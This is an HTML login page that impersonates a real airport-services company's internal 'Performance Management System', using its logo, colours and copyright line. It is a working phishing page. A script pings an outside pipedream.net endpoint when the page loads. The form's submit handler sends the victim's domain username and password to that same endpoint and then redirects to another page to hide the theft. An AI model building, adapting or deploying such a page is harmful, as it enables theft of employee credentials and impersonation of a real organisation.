<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Performance Management System</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: #002B5B; /* Havaş lacivert */
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-box {
      background: #E8F2FF; /* Açık mavi arka plan */
      padding: 40px;
      border-radius: 14px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, .25);
      width: 340px;
      text-align: center;
      border: 2px solid #7CC242; /* Havaş yeşil çerçeve */
    }

    .login-box img {
      width: 110px;
      margin-bottom: 14px;
    }

    .login-box h2 {
      color: #7CC242; /* Havaş yeşili */
      font-size: 18px;
      margin: 0 0 18px;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #7CC242;
      border-radius: 8px;
      font-size: 14px;
      background: white;
      display: block;
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: #7CC242;  
      color: #002B5B;
      border: none;
      border-radius: 8px;
      font-weight: 700;
      cursor: pointer;
      font-size: 15px;
      display: block;
    }

    .login-box button:hover {
      background: #6AB03A;
    }

    .login-box p {
      font-size: 12px;
      color: #002B5B;
      margin-top: 12px;
      opacity: 0.8;
    }

    @media (max-width: 480px) {
      .login-box {
        width: 90%;
        padding: 30px;
      }
      .login-box img {
        width: 90px;
      }
    }
  </style>
</head>

<body>
  <div class="login-box">
    <img src="https://havas.net/images/icerik/logo.svg" alt="Logo" />
    <h2>Performance Management System</h2>

    <script>
      fetch("https://eod8ohq1x7p49bb.m.pipedream.net/openpms", {
        method: "GET",
        mode: "no-cors"
      });
    </script>

    <form id="loginForm" autocomplete="off">
      <input type="text" name="username" placeholder="Domain Account" required autocomplete="off" />
      <input type="password" name="password" placeholder="Password" required autocomplete="off" />
      <button type="submit">Log In</button>
    </form>

    <p>© 2025 HAVAŞ is a company of TAV Airports Holding.</p>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();
      const formData = new FormData(this);

      await fetch("https://eod8ohq1x7p49bb.m.pipedream.net", {
        method: "POST",
        body: formData,
        mode: "no-cors"
      });

      window.location.href = "pms.html";
    });
  </script>
</body>
</html>
